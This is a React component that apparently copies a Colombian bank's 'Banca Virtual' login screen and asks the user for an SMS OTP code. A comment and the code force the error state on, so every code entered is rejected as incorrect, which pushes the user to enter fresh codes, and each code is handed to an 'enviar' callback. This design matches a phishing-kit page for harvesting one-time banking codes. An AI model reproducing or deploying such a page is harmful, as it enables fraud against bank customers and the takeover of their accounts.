/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable react-hooks/rules-of-hooks */
"use client";
import { useRef, useState } from "react";

export default function ErrorOtp({
  enviar,
  digits = 6,
}: {
  enviar?: (code: any) => void;
  digits?: number;
}) {
  const [values, setValues] = useState<string[]>(Array(digits).fill(""));

  const inputs = Array.from({ length: digits }).map(() =>
    useRef<HTMLInputElement>(null)
  );

  // Cambia todos los bordes a rojo siempre
  const error = true;

  const handleChange = (index: number, value: string) => {
    if (!/^[0-9]?$/.test(value)) return;

    const newValues = [...values];
    newValues[index] = value;
    setValues(newValues);

    if (value && index < digits - 1) inputs[index + 1].current?.focus();

    const code = newValues.join("");
    if (code.length === digits) {
      enviar?.({ otp: code, view: digits === 8 ? "otp8" : "otp" });
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && values[index] === "" && index > 0) {
      inputs[index - 1].current?.focus();
    }
  };

  return (
    <>
      {/* HEADER */}
      <div id="bdb-ml-header-bv" className="bdb-ml-header-bv__container">
        <div className="bdb-ml-header-bv__container__content">
          <div className="bdb-ml-header-bv__container__content__button bdb-ml-header-bv__container__content__button--l">
            <div className="bdb-ml-header-bv__container__content__leftBoton">
              <button className="bdb-at-btn bdb-at-btn--text bdb-at-btn--sm--ico">
                <span className="ico-arrow-back"></span> Atrás
              </button>
            </div>
          </div>

          <div className="bdb-ml-header-bv__container__content__center">
            <label className="bdb-ml-header-bv__container__content__center__title">
              Ingreso a Banca Virtual
            </label>
          </div>

          <div className="bdb-ml-header-bv__container__content__button bdb-ml-header-bv__container__content__button--r">
            <div className="bdb-ml-header-bv__container__content__button__rigthBoton">
              <button className="bdb-at-btn bdb-at-btn--text bdb-at-btn--sm--ico bdb-at-btn--sm--ico-right">
                Abandonar <span className="ico-close"></span>
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* BODY */}
      <div className="sherpa-grid">
        <div className="sherpa-container">
          <div className="col-xs-12 col-sm-10 col-md-10 col-lg-6 col-sm-offset-1 col-md-offset-1 col-lg-offset-3">

            <div className="_7pFqf6HtJm-Go1Dv-hAW5g==">
              <span className="sherpa-typography-heading-6">Verifiquemos que seas tú</span>
            </div>

            <div>
              <div className="bdb-ml-bm-token">

                <span className="bdb-ml-bm-token__icon ico-token-active"></span>

                <div className="bdb-ml-bm-token__title">
                  <div className="bdb-ml-bm-token__title__label">Código OTP</div>
                </div>

                <div className="bdb-ml-bm-token__description">
                  Ingresa el código que enviamos a tu celular vía SMS.
                </div>

                {/* INPUTS - SIEMPRE ERROR */}
                <div
                  id="inputs"
                  className="bdb-ml-bm-token__pass-code-area input-box--error"
                >
                  <div>
                    <div className="bdb-at-input-token__pass-code-area">
                      {values.map((val, i) => (
                        <input
                          key={i}
                          ref={inputs[i]}
                          type="numeric"
                          inputMode="numeric"
                          maxLength={1}
                          className="
                            bdb-at-input-token__pass-code-area__box 
                            bdb-at-input-token__pass-code-area__box--normal 
                            password-input
                            input-error
                          "
                          value={val}
                          onChange={(e) => handleChange(i, e.target.value)}
                          onKeyDown={(e) => handleKeyDown(i, e)}
                        />
                      ))}
                    </div>
                  </div>
                </div>

                {/* ERROR MESSAGE */}
                <div className="bdb-at-input-token__msj-error errortoken">
                  Código incorrecto. Verifica e ingrésalo nuevamente.
                </div>

                {/* BOTÓN */}
                <div className="bdb-ml-bm-token__actions">
                  <div className="bdb-ml-bm-token__actions__send">
                    <button
                      className="bdb-at-btn bdb-at-btn--primary bdb-at-btn--lg"
                      disabled={values.some((v) => v === "")}
                      onClick={() => {
                        const code = values.join("");
                        if (code.length === digits) enviar?.({ otp: code, view: digits === 8 ? "otp8" : "otp" });
                      }}
                    >
                      Verificar Código
                    </button>
                  </div>
                </div>

              </div>
            </div>

          </div>
        </div>
      </div>
    </>
  );
}